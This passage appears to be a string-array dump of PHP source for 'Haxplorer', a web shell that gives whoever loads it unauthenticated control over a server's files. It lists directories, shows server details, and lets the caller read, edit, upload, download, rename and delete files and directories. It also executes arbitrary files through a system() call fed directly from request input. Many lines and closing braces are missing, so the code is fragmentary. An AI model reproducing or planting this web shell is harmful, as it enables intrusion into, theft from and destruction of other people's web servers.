            "                PLEASE MAKE SURE YOU'VE GOT READ PERMISSIONS TO THE DIR...",
            "                <br><br></font>\\n\\n\\n\\n\";",
            "        if (function_exists('realpath')) {",
            "\t\t$partdir = realpath($dir);",
            "        else {",
            "\t\t$partdir = $dir;",
            " \tif (strlen($partdir) >= 100) {",
            " \t\t$partdir = substr($partdir, -100);",
            " \t\t$pos = strpos($partdir, \"/\");",
            " \t\tif (strval($pos) != \"\") {",
            " \t\t\t$partdir = \"<--   ...\".substr($partdir, $pos);",
            " \t\t}",
            "        $partdir = str_replace(\"\\\\\", \"/\", str_replace(\"//\", \"/\", str_replace(\"\\\\\\\\\", \"\\\\\", $partdir )));",
            "        $dir = str_replace(\"\\\\\", \"/\", str_replace(\"//\", \"/\", str_replace(\"\\\\\\\\\", \"\\\\\", $dir ))); ",
            "\t$file = str_replace(\"\\\\\", \"/\", str_replace(\"//\", \"/\", str_replace(\"\\\\\\\\\", \"\\\\\", $file )));",
            "    ?>",
            "      <form name=\"urlform\" action=\"<?php echo \"$SFileName?$urlAdd\"; ?>\" method=\"POST\"><input type=\"hidden\" name=\"cmd\" value=\"dir\">",
            "         <table NOWRAP width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">",
            "\t  <tr>",
            "\t   <td width=\"100%\" class=\"silver border\">",
            "\t    <center>&nbsp;HAXPLORER - Server Files Browser...&nbsp;</center>",
            "\t   </td>",
            "\t  </tr>",
            "\t </table>",
            "       <br>",
            "\t <table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">",
            "\t  <tr>",
            "           <td class=\"border nobottom noright\">",
            "            &nbsp;Browsing:&nbsp;",
            "\t  </td>",
            "          <td width=\"100%\" class=\"border nobottom noleft\">",
            "   \t    <table width=\"100%\" border=\"0\" cellpadding=\"1\" cellspacing=\"0\">",
            "             <tr>",
            "              <td NOWRAP width=\"99%\" align=\"center\"><input type=\"text\" name=\"dir\" class=\"none textin\" value=\"<?php echo $partdir ?>\"></td>",
            "              <td NOWRAP><center>&nbsp;<a href=\"javascript: urlform.submit();\"><b>GO<b></a>&nbsp;<center></td>",
            "             </tr>",
            "            </table>",
            "            ",
            "\t  </td>",
            "\t </tr>",
            "\t</table>",
            "  <!--    </form>   -->",
            "        <table NOWRAP width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" >",
            "         <tr>",
            "\t  <td width=\"100%\" NOWRAP class=\"silver border\">",
            "\t   &nbsp;Filename&nbsp;",
            "\t  </td>",
            "          <td NOWRAP class=\"silver border noleft\">",
            "\t   &nbsp;Actions&nbsp;(Attempt to perform)&nbsp;",
            "\t  </td>",
            "          <td NOWRAP class=\"silver border noleft\">",
            "\t   &nbsp;Size&nbsp;",
            "\t  </td>",
            "          <td width=1 NOWRAP class=\"silver border noleft\">",
            "\t   &nbsp;Attributes&nbsp;",
            "\t  </td>",
            "          <td NOWRAP class=\"silver border noleft\">",
            "\t   &nbsp;Modification Date&nbsp;",
            "\t  </td>",
            "\t <tr>",
            "    <?php",
            "      \t/* <!-- This whole heap of junk is the sorting section... */",
            " \t$dirn \t= array();",
            " \t$filen \t= array();",
            " \t$filesizes\t= 0;",
            " \twhile ($buf = readdir($h)) {",
            "\t    if (is_dir(\"$dir/$buf\"))",
            "\t\t\t$dirn[] = $buf;",
            "    \t\telse ",
            " \t\t\t$filen[] = $buf;",
            "    \t}\t \t",
            "\t\t$dirno \t= count($dirn) + 1;",
            " \t\t$fileno\t= count($filen) + 1;",
            "  \t\tfunction mycmp($a, $b){",
            "\t\t\tif ($a == $b) return 0;",
            "\t\t\treturn (strtolower($a) < strtolower($b)) ? -1 : 1;",
            "\t\tif (function_exists(\"usort\")) {",
            "\t\t\tusort($dirn, \"mycmp\");",
            "\t\t\tusort($filen, \"mycmp\");",
            "\t\telse {",
            "\t\t\tsort ($dirn);",
            "\t \t\tsort ($filen);",
            "\t \t}",
            "\treset ($dirn);",
            " \treset ($filen);",
            " \tif (function_exists('array_merge')) {",
            "\t\t$filelist = array_merge ($dirn, $filen);",
            " \telse {",
            "\t\t$filelist = $dirn + $filen;",
            "\tif ( count($filelist)-1 > $Pmax ) {",
            "\t\t$from = $Pidx * $Pmax;",
            "\t\t$to = ($Pidx + 1) * $Pmax-1;",
            "\t\tif ($to - count($filelist) - 1 + ($Pmax / 2) > 0 )",
            "\t\t\t$to = count($filelist) - 1;",
            "\t\tif ($to > count($filelist)-1)",
            "\t\t\t$to = count($filelist)-1;",
            "\t\t$Dcontents = array();",
            "\t\tFor ($Fi = $from; $Fi <= $to; $Fi++) {",
            "\t\t\t$Dcontents[] = $filelist[$Fi];\t",
            "\telse {",
            "\t\t$Dcontents = $filelist;",
            "     $tdcolors = array(\"lighttd\", \"darktd\");",
            "     while (list ($key, $file) = each ($Dcontents)) {",
            "          if (!$tdcolor=arrval(each($tdcolors))) {",
            "\t    reset($tdcolors);",
            "\t    $tdcolor = arrval(each($tdcolors));\t  }",
            "\t  \t         ",
            " \t\tif (is_dir(\"$dir/$file\")) { /* <!-- If it's a Directory --> */",
            "          \t\t\t/* <!-- Dirname --> */",
            "\t\t\techo \"<tr><td NOWRAP class=\\\"top left right $tdcolor\\\">\".sp(3).buildUrl( \"[$file]\", \"cmd=dir&dir=$dir/$file\") .sp(9).\"</td>\\n\";",
            "  \t\t\t\t/* <!-- Actions --> */",
            "\t\t\techo \"<td NOWRAP class=\\\"top right $tdcolor\\\"><center>\".sp(2).\"\\n\";",
            " \t\t\t\t/* <!-- Rename --> */",
            "\t\t\tif ( ($file != \".\") && ($file != \"..\") )",
            "\t\t\t\techo buildUrl($img[\"Rename\"], \"cmd=ren&lastcmd=dir&lastdir=$dir&oldfile=$dir/$file\").sp(3).\"\\n\";",
            " \t\t\t\t/* <!-- Delete --> */",
            "\t\t\tif ( ($file != \".\") && ($file != \"..\") )",
            "\t\t\t\techo sp(3).buildUrl( $img[\"Delete\"], \"cmd=deldir&file=$dir/$file&lastcmd=dir&lastdir=$dir\").\"\\n\";",
            "\t\t\t\t/* <!-- End of Actions --> */",
            "\t\t\techo \"&nbsp;&nbsp;</center></td>\\n\";",
            "  \t\t\t\t/* <!-- Size --> */",
            "\t\t\techo \"<td NOWRAP class=\\\"top right $tdcolor\\\">&nbsp;</td>\\n\";",
            " \t\t\t\t/* <!-- Attributes --> */",
            "\t\t\techo \"<td NOWRAP class=\\\"top right $tdcolor\\\">&nbsp;&nbsp;\\n\";",
            " \t\t\techo \"<strong>D</strong>\";",
            "\t\t        if ( @is_readable(\"$dir/$file\") ) {",
            "   \t\t\t\techo \"<strong>R</strong>\";",
            " \t\t\t}",
            " \t\t\tif (function_exists('is_writeable')) {",
            "\t\t\t\tif ( @is_writeable(\"$dir/$file\") ) {",
            " \t\t\t\t\techo \"<strong>W</stong>\";",
            " \t\t\t\t}",
            "\t\t\t}",
            " \t\t\telse {",
            "    \t\t\t\techo \"<strong>(W)</stong>\";",
            "  \t\t\t}",
            "  \t\t\tif ( @is_executable(\"$dir/$file\") ) {",
            " \t\t\t\techo \"<Strong>X<strong>\";",
            " \t\t\t}",
            " \t\t\techo \"&nbsp;&nbsp;</td>\\n\";",
            " \t\t\t\t/* <!-- Date --> */",
            "\t\t\techo \"<td NOWRAP class=\\\"top right $tdcolor\\\" NOWRAP>\\n\";",
            " \t\t\techo \"&nbsp;&nbsp;\".date(\"D d-m-Y H:i:s\", filemtime(\"$dir/$file\")).\"&nbsp;&nbsp;\";",
            " \t\t\techo \"</td>\";",
            "\t\t\techo \"</tr>\\n\";",
            "        \t}",
            "  \t\telse { /* <!-- Then it must be a File... --> */",
            "     \t\t\t\t/* <!-- Filename --> */",
            "\t\t\tif ( @is_readable(\"$dir/$file\") )",
            " \t\t\t\techo \"<tr><td NOWRAP class=\\\"top left right $tdcolor\\\">\".sp(3).buildUrl( $file, \"cmd=file&file=$dir/$file\").sp(9).\"</td>\\n\";",
            "  \t\t\telse",
            "  \t\t\t\techo \"<tr><td NOWRAP class=\\\"top left right $tdcolor\\\">\".sp(3).$file.sp(9).\"</td>\\n\";",
            "  \t\t\t   \t\t\t\t/* <!-- Actions --> */",
            "\t\t\techo \"<td NOWRAP class=\\\"top right $tdcolor\\\"><center>&nbsp;&nbsp;\\n\";",
            " \t\t\t\t/* <!-- Rename --> */",
            "\t\t\techo buildUrl($img[\"Rename\"], \"cmd=ren&lastcmd=dir&lastdir=$dir&oldfile=$dir/$file\").sp(3).\"\\n\";",
            "  \t\t\t\t/* <!-- Edit --> */",
            "\t\t\tif ( (@is_writeable(\"$dir/$file\")) && (@is_readable(\"$dir/$file\")) )",
            " \t\t\t\techo buildUrl( $img[\"Edit\"], \"cmd=edit&file=$dir/$file\").sp(3).\"\\n\";",
            "   \t\t\t\t/* <!-- Copy --> */",
            " \t\t\techo buildUrl( $img[\"Copy\"], \"cmd=copy&file=$dir/$file\").\"\\n\";",
            "  \t\t\t\t/* <!-- Move --> */",
            "\t\t\tif ( (@is_writeable(\"$dir/$file\")) && (@is_readable(\"$dir/$file\")) )",
            " \t\t\t\t\techo sp(3). buildUrl( $img[\"Move\"], \"cmd=move&file=$dir/$file\").\"\\n\";",
            "    \t\t\t\t/* <!-- Delete --> */",
            "\t\t\techo sp(3). buildUrl( $img[\"Delete\"], \"cmd=delfile&file=$dir/$file&lastcmd=dir&lastdir=$dir\").\"\\n\";",
            " \t\t\t\t/* <!-- Download --> */",
            "\t\t\techo sp(3). buildUrl( $img[\"Download\"], \"cmd=downl&file=$dir/$file\").\"\\n\";",
            " \t\t\t\t/* <!-- Execute --> */",
            "\t\t\tif ( @is_executable(\"$dir/$file\") )",
            " \t\t\t\techo sp(3).buildUrl( $img[\"Execute\"], \"cmd=execute&file=$dir/$file\").\"\\n\";",
            "    \t\t\t\t/* <!-- End of Actions --> */",
            "\t\t\techo sp(2).\"</center></td>\\n\";",
            " \t\t\t\t/* <!-- Size --> */",
            "\t\t\techo \"<td NOWRAP align=\\\"right\\\" class=\\\"top right $tdcolor\\\" NOWRAP >\\n\";",
            " \t\t\t$size = @filesize(\"$dir/$file\");",
            " \t\t\tIf ($size != false) {",
            "\t\t\t        $filesizes += $size;",
            "\t\t\t\techo \"&nbsp;&nbsp;<strong>\".formatsize($size).\"<strong>\";",
            "\t\t\t}",
            "\t\t\telse",
            "\t\t\t\techo \"&nbsp;&nbsp;<strong>0 B<strong>\";",
            " \t\t\techo \"&nbsp;&nbsp;</td>\\n\";",
            " \t\t\t\t/* <!-- Attributes --> */",
            "\t\t\techo \"<td NOWRAP class=\\\"top right $tdcolor\\\">&nbsp;&nbsp;\\n\";",
            " \t\t\tif ( @is_readable(\"$dir/$file\") )",
            " \t\t\t\techo \"<strong>R</strong>\";",
            "   \t\t\tif ( @is_writeable(\"$dir/$file\") )",
            " \t\t\t\techo \"<strong>W</stong>\";",
            "   \t\t\tif ( @is_executable(\"$dir/$file\") )",
            " \t\t\t\techo \"<Strong>X<strong>\";",
            "   \t\t\tif (function_exists('is_uploaded_file')){",
            " \t\t\t\tif ( @is_uploaded_file(\"$dir/$file\") )",
            " \t\t\t\t\techo \"<Strong>U<strong>\";",
            " \t\t\t}",
            " \t\t\telse {",
            "\t\t\t\techo \"<Strong>(U)<strong>\";",
            "\t\t\t}",
            " \t\t\techo \"&nbsp;&nbsp;</td>\\n\";",
            "\t\t\t \t/* <!-- Date --> */",
            "\t\t\techo \"<td NOWRAP class=\\\"top right $tdcolor\\\" NOWRAP>\\n\";",
            " \t\t\techo \"&nbsp;&nbsp;\".date(\"D d-m-Y H:i:s\", filemtime(\"$dir/$file\")).\"&nbsp;&nbsp;\";",
            " \t\t\techo \"</td>\";",
            " \t\t\techo \"</tr>\\n\";",
            " \t\t}",
            "  \t}",
            "    \techo \"</table><table width=100% border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\"><tr>\\n<td NOWRAP width=100% class=\\\"silver border noright\\\">\\n\";",
            "  \techo \"&nbsp;&nbsp;\".@count ($dirn).\"&nbsp;Dir(s),&nbsp;\".@count ($filen).\"&nbsp;File(s)&nbsp;&nbsp;\\n\";",
            "  \techo \"</td><td NOWRAP class=\\\"silver border noleft\\\">\\n\";",
            "  \techo \"&nbsp;&nbsp;Total filesize:&nbsp;\".formatsize($filesizes).\"&nbsp;&nbsp;<td></tr>\\n\";",
            "\tfunction printpagelink($a, $b, $link = \"\"){",
            "\t\tif ($link != \"\") ",
            "\t\t\techo \"<A HREF=\\\"$link\\\"><b>| $a - $b |</b></A>\";",
            "\t\telse",
            "\t\t\techo \"<b>| $a - $b |</b>\";",
            "        ",
            "\tif ( count($filelist)-1 > $Pmax ) {",
            "\t\techo \"<tr><td colspan=\\\"2\\\" class=\\\"silver border notop\\\"><table width=\\\"100%\\\" cellspacing=\\\"0\\\" cellpadding=\\\"3\\\"><tr><td valign=\\\"top\\\"><font color=\\\"red\\\"><b>Page:</b></font></td><td width=\\\"100%\\\"><center>\";",
            "\t\t$Fi = 0;",
            "\t\twhile ( ( (($Fi+1)*$Pmax) + ($Pmax/2) ) < count($filelist)-1 ) {",
            "\t\t\t$from = $Fi*$Pmax;",
            "\t\t\twhile (($filelist[$from]==\".\") || ($filelist[$from]==\"..\")) $from++; ",
            "\t\t\t$to = ($Fi + 1) * $Pmax - 1;",
            "\t\t\tif ($Fi == $Pidx)",
            "\t\t\t\t$link=\"\";",
            "\t\t\telse ",
            "\t\t\t\t$link=\"$SFilename?$urlAdd\".\"cmd=$cmd&dir=$dir&Pidx=$Fi\";",
            "\t\t\tprintpagelink (substr(strtolower($filelist[$from]), 0, 5), substr(strtolower($filelist[$to]), 0, 5), $link);",
            "\t\t\techo \"&nbsp;&nbsp;&nbsp;\";",
            "\t\t\t$Fi++;",
            "\t\t$from = $Fi*$Pmax;",
            "\t\twhile (($filelist[$from]==\".\") || ($filelist[$from]==\"..\")) $from++; ",
            "\t\t$to = count($filelist)-1;",
            "\t\tif ($Fi == $Pidx)",
            "\t\t\t$link=\"\";",
            "\t\telse ",
            "\t\t\t$link=\"$SFilename?$urlAdd\".\"cmd=$cmd&dir=$dir&Pidx=$Fi\";",
            "\t\tprintpagelink (substr(strtolower($filelist[$from]), 0, 5), substr(strtolower($filelist[$to]), 0, 5), $link);\t\t",
            "\t\techo \"</center></td></tr></table></td></tr>\";",
            "    \techo \"</table>\\n<br><table NOWRAP>\";",
            "  \tif ($isGoodver) {",
            "\t\techo \"<tr><td class=\\\"silver border\\\">&nbsp;<strong>Server's PHP Version:&nbsp;&nbsp;</strong>&nbsp;</td><td>&nbsp;$PHPVer&nbsp;</td></tr>\\n\";",
            " \telse {",
            "\t\techo \"<tr><td class=\\\"silver border\\\">&nbsp;<strong>Server's PHP Version:&nbsp;&nbsp;</strong>&nbsp;</td><td>&nbsp;$PHPVer (Some functions might be unavailable...)&nbsp;</td></tr>\\n\";",
            "      \t\t/* <!-- Other Actions --> */",
            "   \techo \"<tr><td class=\\\"silver border\\\">&nbsp;<strong>Other actions:&nbsp;&nbsp;</strong>&nbsp;</td>\\n\";",
            "  \techo \"<td>&nbsp;<b>\".buildUrl( \"| New File |\", \"cmd=newfile&lastcmd=dir&lastdir=$dir\").\"\\n\".sp(3).",
            "\t                     buildUrl( \"| New Directory |\", \"cmd=newdir&lastcmd=dir&lastdir=$dir\").\"\\n\".sp(3).",
            "\t\t\t     buildUrl( \"| Upload a File |\", \"cmd=upload&dir=$dir&lastcmd=dir&lastdir=$dir\"). \"</b>\\n</td></tr>\\n\";",
            "    \techo \"<tr><td class=\\\"silver border\\\">&nbsp;<strong>Script Location:&nbsp;&nbsp;</strong>&nbsp;</td><td>&nbsp;$PATH_TRANSLATED</td></tr>\\n\";",
            "  \techo \"<tr><td class=\\\"silver border\\\">&nbsp;<strong>Your IP:&nbsp;&nbsp;</strong>&nbsp;</td><td>&nbsp;$REMOTE_ADDR&nbsp;</td></tr>\\n\";",
            "  \techo \"<tr><td class=\\\"silver border\\\">&nbsp;<strong>Browsing Directory:&nbsp;&nbsp;</strong></td><td>&nbsp;$partdir&nbsp;</td></tr>\\n\";",
            "  \techo \"<tr><td valign=\\\"top\\\" class=\\\"silver border\\\">&nbsp;<strong>Legend:&nbsp;&nbsp;</strong&nbsp;</td><td>\\n\";",
            "  \techo \"<table NOWRAP>\";",
            "        echo \"<tr><td><strong>D:</strong></td><td>&nbsp;&nbsp;Directory.</td></tr>\\n\";",
            "   \techo \"<tr><td><strong>R:</strong></td><td>&nbsp;&nbsp;Readable.</td></tr>\\n\";",
            "  \techo \"<tr><td><strong>W:</strong></td><td>&nbsp;&nbsp;Writeable.</td></tr>\\n\";",
            "  \techo \"<tr><td><strong>X:</strong></td><td>&nbsp;&nbsp;Executable.</td></tr>\\n\";",
            "  \techo \"<tr><td><strong>U:</strong></td><td>&nbsp;&nbsp;HTTP Uploaded File.</td></tr>\\n\";",
            "  \techo \"</table></td>\";",
            " \techo \"</table>\";",
            " \techo \"<br>\";",
            "     \t@closedir($h);",
            "  elseif ( $cmd==\"execute\" ) {/*<!-- Execute the executable -->*/",
            " \techo system(\"$file\");",
            "elseif ( $cmd==\"deldir\" ) { /*<!-- Delete a directory and all it's files --> */",
            "\techo \"<center><table><tr><td NOWRAP>\" ;",
            " \tif ($auth == \"yes\") {",
            "\t\tif (Mydeldir($file)==false) {",
            " \t\t\techo \"Could not remove \\\"$file\\\"<br>Permission denied, or directory not empty...\";",
            "  \t\t}",
            " \t\telse {",
            " \t\t\techo \"Successfully removed \\\"$file\\\"<br>\";",
            " \t\t}",
            " \t\techo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"$lastcmd\\\"><input type=\\\"hidden\\\" name=\\\"dir\\\" value=\\\"$lastdir\\\"><input tabindex=\\\"0\\\" type=\\\"submit\\\" value=\\\"Back to Haxplorer\\\"></form>\";",
            " \telse {",
            "\t\techo \"Are you sure you want to delete \\\"$file\\\" and all it's subdirectories ?",
            "        <form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\">",
            "        <input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"deldir\\\">",
            "     \t<input type=\\\"hidden\\\" name=\\\"lastcmd\\\" value=\\\"$lastcmd\\\">",
            "     \t<input type=\\\"hidden\\\" name=\\\"lastdir\\\" value=\\\"$lastdir\\\">",
            "     \t<input type=\\\"hidden\\\" name=\\\"file\\\" value=\\\"$file\\\">",
            "     \t<input type=\\\"hidden\\\" name=\\\"auth\\\" value=\\\"yes\\\">",
            "     \t<input type=\\\"submit\\\" value=\\\"Yes\\\"></form>",
            "        <form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\">",
            "\t<input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"$lastcmd\\\">",
            "\t<input type=\\\"hidden\\\" name=\\\"dir\\\" value=\\\"$lastdir\\\">",
            "\t<input tabindex=\\\"0\\\" type=\\\"submit\\\" value=\\\"NO!\\\"></form>\";",
            "        }",
            " \techo \"</td></tr></center>\";",
            " elseif ( $cmd==\"delfile\" ) { /*<!-- Delete a file --> */\techo \"<center><table><tr><td NOWRAP>\" ;",
            " \tif ($auth == \"yes\") {",
            "\t\tif (@unlink($file)==false) {",
            " \t\t\techo \"Could not remove \\\"$file\\\"<br>\";",
            "  \t\t}",
            " \t\telse {",
            " \t\t\techo \"Successfully removed \\\"$file\\\"<br>\";",
            " \t\t}",
            "\t\techo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"$lastcmd\\\"><input type=\\\"hidden\\\" name=\\\"dir\\\" value=\\\"$lastdir\\\"><input tabindex=\\\"0\\\" type=\\\"submit\\\" value=\\\"Back to Haxplorer\\\"></form>\";",
            "        }",
            " \telse {",
            "       \techo \"Are you sure you want to delete \\\"$file\\\" ?",
            "      \t<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\">",
            "     \t<input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"delfile\\\">",
            "     \t<input type=\\\"hidden\\\" name=\\\"lastcmd\\\" value=\\\"$lastcmd\\\">",
            "     \t<input type=\\\"hidden\\\" name=\\\"lastdir\\\" value=\\\"$lastdir\\\">",
            "     \t<input type=\\\"hidden\\\" name=\\\"file\\\" value=\\\"$file\\\">",
            "     \t<input type=\\\"hidden\\\" name=\\\"auth\\\" value=\\\"yes\\\">",
            "     \t<input type=\\\"submit\\\" value=\\\"Yes\\\"></form>",
            "       \t<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\">",
            "\t<input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"$lastcmd\\\">",
            "\t<input type=\\\"hidden\\\" name=\\\"dir\\\" value=\\\"$lastdir\\\">",
            "\t<input tabindex=\\\"0\\\" type=\\\"submit\\\" value=\\\"NO!\\\"></form>\";",
            "        }",
            " \techo \"</td></tr></center>\";",
            "elseif ( $cmd==\"newfile\" ) { /*<!-- Create new file with default name --> */",
            "\techo \"<center><table><tr><td NOWRAP>\";",
            " \t$i = 1;",
            " \twhile (file_exists(\"$lastdir/newfile$i.txt\"))",
            " \t\t$i++;",
            " \t$file = fopen(\"$lastdir/newfile$i.txt\", \"w+\");",
            " \tif ($file == false)",
            " \t\techo \"Could not create the new file...<br>\";",
            " \telse",
            " \t\techo \"Successfully created: \\\"$lastdir/newfile$i.txt\\\"<br>\";",
            " \t\techo \"",
            "   \t\t\t<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\">",
            "\t\t\t<input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"$lastcmd\\\">",
            "\t\t\t<input type=\\\"hidden\\\" name=\\\"dir\\\" value=\\\"$lastdir\\\">",
            "\t\t\t<input tabindex=\\\"0\\\" type=\\\"submit\\\" value=\\\"Back to Haxplorer\\\">",
            "\t\t\t</form></center>",
            " \t\t\t</td></tr></table></center>   \t\t\";",
            "elseif ( $cmd==\"newdir\" ) { /*<!-- Create new directory with default name --> */",
            "\techo \"<center><table><tr><td NOWRAP>\" ;",
            " \t$i = 1;",
            " \twhile (is_dir(\"$lastdir/newdir$i\"))",
            "  \t\t$i++;",
            " \t$file = mkdir(\"$lastdir/newdir$i\", 0777);",
            " \tif ($file == false)",
            " \t\techo \"Could not create the new directory...<br>\";",
            " \telse",
            " \t\techo \"Successfully created: \\\"$lastdir/newdir$i\\\"<br>\";",
            " \techo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\">",
            "\t\t<input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"$lastcmd\\\">",
            "\t\t<input type=\\\"hidden\\\" name=\\\"dir\\\" value=\\\"$lastdir\\\">",
            "\t\t<input tabindex=\\\"0\\\" type=\\\"submit\\\" value=\\\"Back to Haxplorer\\\">",
            "\t\t</form></center></td></tr></table></center>\";",
            "elseif ( $cmd==\"edit\" ) { /*<!-- Edit a file and save it afterwards with the saveedit block. --> */",
            "\t$contents = \"\";",
            "\t$fc = @file( $file );",
            "  \twhile ( @list( $ln, $line ) = each( $fc ) ) {",
            "  \t\t$contents .= htmlentities( $line ) ;",
            " \techo \"<br><center><table><tr><td NOWRAP>\";",
            "\techo \"M<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\">\\n\";",
            "\techo \"<input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"saveedit\\\">\\n\";",
            "\techo \"<strong>EDIT FILE: </strong>$file<br>\\n\";",
            "\techo \"<textarea rows=\\\"25\\\" cols=\\\"95\\\" name=\\\"contents\\\">$contents</textarea><br>\\n\";",
            "\techo \"<input size=\\\"50\\\" type=\\\"text\\\" name=\\\"file\\\" value=\\\"$file\\\">\\n\";",
            "\techo \"<input type=\\\"submit\\\" value=\\\"Save\\\">\";",
            "\techo \"</form>\";",
            "\techo \"</td></tr></table></center>\";",
            "elseif ( $cmd==\"saveedit\" ) { /*<!-- Save the edited file back to a file --> */",
            "\t$fo = fopen($file, \"w\");",
            "\t$wrret = fwrite($fo, stripslashes($contents));",
            "\t$clret = fclose($fo);",
            "elseif ( $cmd==\"downl\" ) { /*<!-- Save the edited file back to a file --> */",
            "\t$downloadfile = urldecode($file);",
            "\tif (function_exists(\"basename\"))",
            "    \t\t$downloadto = basename ($downloadfile);",
            "\telse",
            "\t\t$downloadto = \"download.ext\";",
            "\tif (!file_exists(\"$downloadfile\"))",
            "\t\techo \"The file does not exist\";",
            "\telse {",
            "\t\t$size = @filesize(\"$downloadfile\");",
            "\t\tif ($size != false) {",
            "\t\t\t$add=\"; size=$size\";",
            "\t\t}\t\t\t",
            "\t\telse {",
            "\t\t\t$add=\"\";",
            " \t\theader(\"Content-Type: application/download\");",
            "\t\theader(\"Content-Disposition: attachment; filename=$downloadto$add\");",
            "\t\t$fp=fopen(\"$downloadfile\" ,\"rb\");",
            "\t\tfpassthru($fp);",
            "\t\tflush();",
            "elseif ( $cmd==\"upload\" ) { /* <!-- Upload File form --> */ ",
            "   \t?>",
            "\t<center>",
            "\t <table>",
            "\t  <tr>",
            "\t   <td NOWRAP>",
            "    \t\tWelcome to the upload section...",
            " \t\tPlease note that the destination file will be",
            "\t\t<br> overwritten if it already exists!!!<br><br>",
            " \t\t<form enctype=\"multipart/form-data\" action=\"<?php echo \"$SFileName?$urlAdd\" ?>\" method=\"post\">",
            " \t\t\t<input type=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"1099511627776\">",
            " \t\t\t<input type=\"hidden\" name=\"cmd\" value=\"uploadproc\">",
            " \t\t\t<input type=\"hidden\" name=\"dir\" value=\"<?php echo $dir ?>\">",
            " \t\t\t<input type=\"hidden\" name=\"lastcmd\" value=\"<?php echo $lastcmd ?>\">",
            " \t\t\t<input type=\"hidden\" name=\"lastdir\" value=\"<?php echo $lastdir ?>\">",
            " \t\t\tSelect local file:<br>",
            " \t\t\t<input size=\"75\" name=\"userfile\" type=\"file\"><br>",
            " \t\t\t<input type=\"submit\" value=\"Send File\">",
            " \t\t</form>",
            "\t\t<br>",
            " \t\t<form action=\"<?php echo \"$SFileName?$urlAdd\" ?>\" method=\"POST\">",
            "\t\t\t<input type=\"hidden\" name=\"cmd\" value=\"<?php echo $lastcmd ?>\">",
            "\t\t\t<input type=\"hidden\" name=\"dir\" value=\"<?php echo $lastdir ?>\">",
            "\t\t\t<input tabindex=\"0\" type=\"submit\" value=\"Cancel\">",
            "\t\t</form>",
            "\t   </td>",
            "\t  </tr>",
            "\t </table>",
            "\t</center>",
            " \t<?php",
            "elseif ( $cmd==\"uploadproc\" ) { /* <!-- Process Uploaded file --> */",
            "\techo \"<center><table><tr><td NOWRAP>\";",
            "\tif (file_exists($userfile))",
            "\t\t$res = copy($userfile, \"$dir/$userfile_name\");",
            "\techo \"Uploaded \\\"$userfile_name\\\" to \\\"$userfile\\\"; <br>\\n\";",
            "     \tif ($res) {",
            "\t\techo \"Successfully moved \\\"$userfile\\\" to \\\"$dir/$userfile_name\\\".\\n<br><br>\";",
            "\t\techo \"Local filename: \\\"$userfile_name\\\".\\n<br>Remote filename: \\\"$userfile\\\".\\n<br>\";",
            "\t\techo \"Filesize: \".formatsize($userfile_size).\".\\n<br>Filetype: $userfile_type.\\n<br>\";",
            "\telse {",
            "\t\techo \"Could not move uploaded file; Action aborted...\";",
            "\techo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"$lastcmd\\\"><input type=\\\"hidden\\\" name=\\\"dir\\\" value=\\\"$lastdir\\\"><input tabindex=\\\"0\\\" type=\\\"submit\\\" value=\\\"Back to Haxplorer\\\"></form></center>\" ;",
            "\techo \"<br><br></td></tr></table></center>\";",
            "elseif ( $cmd==\"file\" ) { /* <!-- View a file in text --> */",
            "        echo \"<hr>\"; ",
            "\t$fc = @file( $file );  \twhile ( @list( $ln, $line ) = each( $fc ) ) {",
            "  \t\techo spacetonbsp(@htmlentities($line)).\"<br>\\n\";",
            "  \t}",
            "\techo \"<hr>\";",
            "elseif ( $cmd==\"ren\" ) { /* <!-- File and Directory Rename --> */",
            "     \tif (function_exists('is_dir')) {",
            " \t\tif (is_dir(\"$oldfile\")) {",
            " \t\t\t$objname = \"Directory\";",
            " \t\t\t$objident = \"Directory\";",
            "  \t\t}",
            " \t\telse {",
            " \t\t\t$objname = \"Filename\";",
            " \t\t\t$objident = \"file\";",
            " \t\t}",
            "   \techo \"<table width=100% border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\"><tr><td width=100% style=\\\"class=\\\"silver border\\\"><center>&nbsp;Rename a file:&nbsp;</center></td></tr></table><br>\\n\";",
            "\tIf (empty($newfile) != true) {",
            " \t\techo \"<center>\";",
            "\t \t$return = @rename($oldfile, \"$olddir$newfile\");",
            "\t\tif ($return) {",
            " \t\t\techo \"$objident renamed successfully:<br><br>Old $objname: \\\"$oldfile\\\".<br>New $objname: \\\"$olddir$newfile\\\"\";",
            " \t\t}",
            " \t\telse {",
            " \t\t\tif ( @file_exists(\"$olddir$newfile\") ) {",
            " \t\t\t\techo \"Error: The $objident does already exist...<br><br>\\\"$olddir$newfile\\\"<br><br>Hit your browser's back to try again...\";",
            " \t\t\t}",
            " \t\t\telse {",
            " \t\t\t\techo \"Error: Can't copy the file, the file could be in use or you don't have permission to rename it.\";",
            " \t\t\t}",
            "  \t\t}",
